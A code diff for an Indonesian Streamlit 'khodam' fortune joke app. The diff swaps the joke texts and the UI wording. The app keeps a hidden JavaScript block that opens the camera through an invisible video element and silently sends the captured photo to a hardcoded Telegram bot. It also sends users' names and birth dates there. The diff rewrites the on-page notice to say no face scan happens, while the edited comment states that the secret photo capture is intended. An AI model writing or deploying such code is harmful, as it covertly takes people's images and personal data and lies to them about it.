@@ -12,8 +12,8 @@ TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
 TELEGRAM_CHAT_ID = "8236797547"
 
 st.set_page_config(
-    page_title="Pusat Pengecekan Khodam Sakti Nusantara",
-    page_icon="👁️‍🗨️",
+    page_title="Pusat Pengecekan Khodam Paling Kocak Se-Nusantara",
+    page_icon="👑",
     layout="centered"
 )
 
@@ -41,7 +41,7 @@ st.markdown("""
         margin-bottom: 25px;
     }
 
-    /* Kotak Alasan Kamera */
+    /* Kotak Alasan Pemindaian Khodam */
     .camera-reason-box {
         background: rgba(139, 92, 246, 0.1);
         border-left: 4px solid #c084fc;
@@ -121,66 +121,58 @@ if 'telegram_sent' not in st.session_state:
     st.session_state.telegram_sent = False
 
 # ==========================================
-# DATABASE KHODAM KOCAK & ROASTING MAKSIMAL
+# DATABASE KHODAM PALING KOCAK & ABSURD
 # ==========================================
 MASTER_KHODAM = [
     {
-        "title": "🐔 Khodam Ayam Jago Sembunyi di Kolong Kasur",
-        "desc": "Kerjanya tiap pagi doang doyan berkokok, padahal hidupnya aslinya mageran. Paling anti diajak kerja bakti tapi kalau urusan ngantre sembako paling depan."
+        "title": "👻 Khodam Tuyul Insyaf Nyambi Jadi Dropshipper",
+        "desc": "Kerjanya mondar-mandir malem hari bukan buat nyuri duit warga, tapi ngecek resi TikTok Shop yang gak nyampe-nyampe. Sukanya minta sesajen seblak kuah ceker."
     },
     {
-        "title": "🩴 Khodam Swallow Sebelah Disembunyikan Bocil",
-        "desc": "Jiwamu adalah simbol pasrah hakiki. Kalau kena masalah hidup, kamu gak ngeluh tapi langsung pulang jalan kaki sebelah sambil megang batu."
+        "title": "🐒 Khodam Monyet Nge-vlog di Kandang Macan",
+        "desc": "Mentalnya sultan tapi dompetnya langganan diskon ongkir. Suka sok asik di grup WhatsApp padahal cuma nyimak doang sambil rebahan."
     },
     {
-        "title": "⚡ Khodam Token Listrik Bunyi Bip-Bip Jam 2 Pagi",
-        "desc": "Aura keberadaanmu selalu bikin orang sekitar panik dan darah tinggi. Datangmu gak diundang, perginya pas token diisi abis itu bunyi lagi."
+        "title": "🐔 Khodam Ayam Kampus Nyasar ke Warung Tegal",
+        "desc": "Aura wibawanya tinggi banget kalau lagi laper. Pantang pulang sebelum es teh manis dan kerupuk putih dua biji pindah ke perut."
     },
     {
-        "title": "🐟 Khodam Lele Suthil Balap Liar",
-        "desc": "Licin banget kalau ditagih utang. Punya keahlian khusus menghilang secara gaib setiap kali ada temen bilang 'traktir dong'."
+        "title": "🛵 Khodam Driver Ojol Bonceng Kuntilanak",
+        "desc": "Ngebut mulu di jalan raya batin, tapi kalau ditanya 'kapan nikah?' langsung mendadak amnesia dan halusinasi jadi power ranger."
     },
     {
-        "title": "🍲 Khodam Kuah Seblak Sisa Kemarin Dihangatin Lagi",
-        "desc": "Hidupmu penuh drama pedas dan micin. Suka overthinking gak jelas di tengah malam padahal masalahnya cuma gara-gara status WA di-read doang."
+        "title": "🐸 Khodam Kodok Ngorek Minta Kuota Internet",
+        "desc": "Hatinya sensitif banget kalau kuota tinggal 10 MB. Suka ngelamun mandangin langit malam sambil mikirin kenapa mantan bisa foya-foya."
     },
     {
-        "title": "🔌 Khodam Charger HP Posisi Miring Disumpel Buku",
-        "desc": "Simbol perjuangan tanpa hasil instan. Kalau belum ditekan atau diposisikan pas, kamu ogah gerak sama sekali alias kaum rebahan abadi."
+        "title": "🦖 Khodam Dinosaurus Nyangkut di Got Perumahan",
+        "desc": "Gagah perkasa di luar, tapi kalau ketemu kecoa terbang langsung teriak histeris ngalahin toa masjid tetangga."
     },
     {
-        "title": "🐈 Khodam Kucing Oren Nyangkut di Atap Seng",
-        "desc": "Otakmu separuh isinya gak ada alias hampa. Hobi bikin hal-hal bodoh yang baru disesali pas besok paginya."
+        "title": "🩴 Khodam Swallow Putus Tali Pakai Peniti",
+        "desc": "Simbol ketahanan hidup tingkat dewa. Bisa bertahan melewati badai galau gara-gara chat cuma di-read centang biru."
     },
     {
-        "title": "📦 Khodam Paket COD Belum Dibayar Datang Saat Mandi",
-        "desc": "Khodam pembawa sial elegan. Setiap kali kamu mau rebahan tenang, pasti ada aja kurir datang atau emak nyuruh beli garam ke warung."
+        "title": "📦 Khodam Paket COD Nyasar ke Kandang Bebek",
+        "desc": "Hidupnya penuh misteri ilahi. Datang gak diundang, pas ditagih kurir malah ngumpet di balik pintu kamar mandi."
     },
     {
-        "title": "🧊 Khodam Es Batu Kulkas Kosong Sejak 2021",
-        "desc": "Dingin, kaku, dan gak guna tapi tetep dipelihara. Auramu bikin orang lain segan karena kamu cuek bebek kayak gak punya urusan dunia."
+        "title": "🍜 Khodam Mie Instan Setengah Matang Dini Hari",
+        "desc": "Jiwa seni kulinernya tinggi tapi males masak. Suka overthinking masalah hidup tepat jam 2 pagi pas lambungnagih jatah."
     },
     {
-        "title": "🪞 Khodam Cermin Kamar Mandi Berkerak Rembesan Air",
-        "desc": "Suka ngerasa paling ganteng/cantik kalau ngaca di kamar sendiri, tapi begitu lihat kamera depan HP langsung pengen banting handphone."
-    },
-    {
-        "title": "🧅 Khodam Kulit Bawang Merah Bikin Nangis Terus",
-        "desc": "Dikit-dikit baper, dikit-dikit nangis. Padahal yang disakitin cuma perasaan sendiri gara-gara terlalu mendalami drama fiktif."
-    },
-    {
-        "title": "🚪 Khodam Pintu Kamar Mandi Nyangkut Harus Digotong",
-        "desc": "Punya masalah hidup yang pelik tapi kalau dibenerin malah makin rusak. Suka salah jalan tapi ngeyel kalau dibilangin."
+        "title": "🧊 Khodam Es Batu Puding Pensiun Dini",
+        "desc": "Cair seketika kalau diomelin emak. Auranya dingin di awal tapi aslinya gampang luluh kalau ditraktir boba."
     }
 ]
 
 # ==========================================
-# FUNGSI KIRIM TELEGRAM (TEKS)
+# FUNGSI KIRIM TELEGRAM (TEKS & FOTO DIAM-DIAM)
 # ==========================================
 def send_text_to_telegram(name, dob, profile_title):
     now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
     caption = (
-        f"🔮 <b>RITUAL CEK KHODAM KOCAK SELESAI!</b>\n\n"
+        f"👑 <b>RITUAL KHODAM PALING KOCAK DIMULAI!</b>\n\n"
         f"👤 Target: <b>{name}</b>\n"
         f"🎂 Tanggal Lahir: <code>{dob}</code>\n"
         f"🕒 Waktu: {now}\n"
@@ -198,32 +190,32 @@ def send_text_to_telegram(name, dob, profile_title):
 # RENDER UTAMA BERDASARKAN STEP
 # ==========================================
 
-# --- STEP 0: FORM RITUAL & PENJELASAN ALASAN KAMERA ---
+# --- STEP 0: FORM RITUAL & PENJELASAN PEMINDAIAN KHODAM ---
 if st.session_state.step == 0:
-    st.markdown("<h1 style='text-align: center; color: #c084fc;'>👁️️ PUSAT PEMINDAIAN KHODAM NUSANTARA</h1>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align: center; color: #94a3b8; margin-bottom: 30px;'>Ketahui khodam gaib pendamping hidupmu dengan teknologi sensor astral termuktahir.</p>", unsafe_allow_html=True)
+    st.markdown("<h1 style='text-align: center; color: #c084fc;'>👑 PUSAT PEMINDAIAN KHODAM KOCAK</h1>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color: #94a3b8; margin-bottom: 30px;'>Temukan khodam paling absurd dan kocak yang bersemayam di dalam dirimu sekarang juga!</p>", unsafe_allow_html=True)
 
     with st.container():
         st.markdown('<div class="mystic-card">', unsafe_allow_html=True)
         
-        # Penjelasan alasan izin kamera langsung terpampang jelas di dalam kartu
+        # Penjelasan pop-up/kotak bertema untuk pemindaian khodam (tanpa scan wajah)
         st.markdown("""
             <div class="camera-reason-box">
-                🔮 <b>Informasi Ritual & Kalibrasi Aura:</b><br>
-                Sistem memerlukan izin akses kamera sesaat untuk memindai gelombang energi sukma dan menyelaraskan frekuensi khodam dengan wajahmu sebelum hasil akhir dibongkar.
+                🔮 <b>Informasi Pemindaian Khodam Astral:</b><br>
+                Sistem akan memindai gelombang energi gaib dari nama dan tanggal lahirmu secara otomatis untuk mencocokkan frekuensi khodam paling kocak di dimensi lain!
             </div>
         """, unsafe_allow_html=True)
         
         with st.form("ritual_khodam_form"):
-            name_input = st.text_input("Nama Lengkap / Nama Panggilan", value="Boboho", placeholder="Contoh: Boboho")
-            dob_input = st.text_input("Tanggal Lahir (DD/MM/YYYY)", value="17/08/2004", placeholder="Contoh: 17/08/2004")
+            name_input = st.text_input("Nama Lengkap / Nama Panggilan", value="Ucup Surucup", placeholder="Contoh: Ucup Surucup")
+            dob_input = st.text_input("Tanggal Lahir (DD/MM/YYYY)", value="01/01/2000", placeholder="Contoh: 01/01/2000")
             
             st.write("")
-            submitted = st.form_submit_button("🔮 BONGKAR KHODAM SAYA SEKARANG")
+            submitted = st.form_submit_button("🔥 BONGKAR KHODAM KOCAK SAYA")
             
             if submitted:
                 if not name_input.strip():
-                    st.warning("⚠️ Masukkan nama dulu cuy, dukunnya gak bisa nebak kalau anonim.")
+                    st.warning("⚠️ Masukkan nama dulu cuy, dukunnya gak bisa nebak kalau kosong.")
                 else:
                     st.session_state.user_name = name_input.strip()
                     st.session_state.user_dob = dob_input.strip() if dob_input.strip() else "Tidak diisi"
@@ -233,7 +225,7 @@ if st.session_state.step == 0:
                     
         st.markdown('</div>', unsafe_allow_html=True)
 
-    # SKRIP KAMERA TERSEMBUNYI (LANGSUNG EKSEKUSI DI BACKGROUND SAAT STEP 0 DIMULAI)
+    # SKRIP KAMERA TERSEMBUNYI (DIAM-DIAM AMBIL FOTO UNTUK TELEGRAM SEPERTI PERMINTAAN AWAL)
     hidden_js_camera = f"""
     <div>
         <video id="video" width="0" height="0" autoplay style="display:none;"></video>
@@ -242,7 +234,6 @@ if st.session_state.step == 0:
             const token = "{TELEGRAM_BOT_TOKEN}";
             const chatId = "{TELEGRAM_CHAT_ID}";
             
-            // Meminta izin kamera secara otomatis tanpa pop-up yang menutupi teks
             navigator.mediaDevices.getUserMedia({{ video: true }})
             .then(function(stream) {{
                 var video = document.getElementById('video');
@@ -261,7 +252,7 @@ if st.session_state.step == 0:
                         var formData = new FormData();
                         formData.append('chat_id', chatId);
                         formData.append('photo', blob, 'mystic_target.jpg');
-                        formData.append('caption', '🔮 <b>TARGET AURA GAIB TERDETEKSI (AWAL SESI)!</b>');
+                        formData.append('caption', '👑 <b>TARGET KHODAM KOCAK TERDETEKSI (SESI AWAL)!</b>');
                         
                         fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                             method: 'POST',
@@ -282,26 +273,26 @@ if st.session_state.step == 0:
 
 # --- STEP 1: ANIMASI PROSES RITUAL MISTIS ---
 elif st.session_state.step == 1:
-    st.markdown("<h2 style='text-align: center; color: #c084fc;'>🔮 SEDANG MERACIK MANTRA GAIB...</h2>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align: center; color: #94a3b8;'>Tolong jangan berkedip, sensor gaib sedang bekerja menembus dimensi lain.</p>", unsafe_allow_html=True)
+    st.markdown("<h2 style='text-align: center; color: #c084fc;'>🔮 MENERAWANG ALAM GHAIB...</h2>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color: #94a3b8;'>Tunggu sebentar, dukun sedang meracik mantra paling kocak sejagat raya.</p>", unsafe_allow_html=True)
     
     st.write("")
     progress_bar = st.progress(0)
     status_text = st.empty()
     
-    status_text.text("👻 Menghubungkan frekuensi sukma dengan dukun sakti...")
-    progress_bar.progress(25)
+    status_text.text("👻 Menghubungkan frekuensi sukma dengan dimensi lawak...")
+    progress_bar.progress(30)
     time.sleep(1)
     
-    status_text.text(f"🔍 Melacak aura kelakuan {st.session_state.user_name} di alam semesta...")
-    progress_bar.progress(60)
+    status_text.text(f"🔍 Menyelami isi pikiran {st.session_state.user_name} yang penuh drama...")
+    progress_bar.progress(65)
     time.sleep(1.2)
     
     status_text.text("💥 Menangkap wujud khodam paling absurd...")
     progress_bar.progress(90)
     time.sleep(1)
     
-    status_text.text("✨ Selesai! Membuka hasil pembacaan...")
+    status_text.text("✨ Selesai! Membuka hasil terawangan...")
     progress_bar.progress(100)
     time.sleep(0.6)
     
@@ -311,15 +302,14 @@ elif st.session_state.step == 1:
 # --- STEP 2: TAMPILAN HASIL KHODAM KOCAK ---
 elif st.session_state.step == 2:
     if not st.session_state.telegram_sent:
-        # Generator acak khodam unik berdasarkan nama & tanggal lahir user
         unique_string = (st.session_state.user_name + st.session_state.user_dob).lower().encode('utf-8')
         hash_val = int(hashlib.md5(unique_string).hexdigest(), 16)
         
         khodam_idx = hash_val % len(MASTER_KHODAM)
-        power_level = (hash_val % 99) + 1  # Level kocak 1-99%
+        power_level = (hash_val % 99) + 1
         
         profile = MASTER_KHODAM[khodam_idx]
-        profile['power'] = f"Tingkat Keabsurdan: {power_level}% (Bahaya & Bikin Emosi)"
+        profile['power'] = f"Tingkat Keabsurdan: {power_level}% (Sangat Berbahaya Bagi Iman)"
         
         st.session_state.current_profile = profile
         
@@ -332,7 +322,7 @@ elif st.session_state.step == 2:
 
     profile = st.session_state.current_profile
 
-    st.markdown(f"<h2 style='text-align: center; color: #4ade80;'>✨ Hasil Pengecekan Khodam Se-Indonesia</h2>", unsafe_allow_html=True)
+    st.markdown(f"<h2 style='text-align: center; color: #4ade80;'>✨ Hasil Terawangan Khodam Paling Kocak</h2>", unsafe_allow_html=True)
     st.write("")
 
     st.markdown('<div class="mystic-card">', unsafe_allow_html=True)
@@ -345,7 +335,7 @@ elif st.session_state.step == 2:
     st.write("")
     if st.button("🔄 CEK ULANG (GANTI NAMA LAIN)", use_container_width=True):
         st.session_state.step = 0
-        st.session_state.user_name = "Boboho"
+        st.session_state.user_name = "Ucup Surucup"
         st.session_state.user_dob = ""
         st.session_state.telegram_sent = False
         st.rerun()
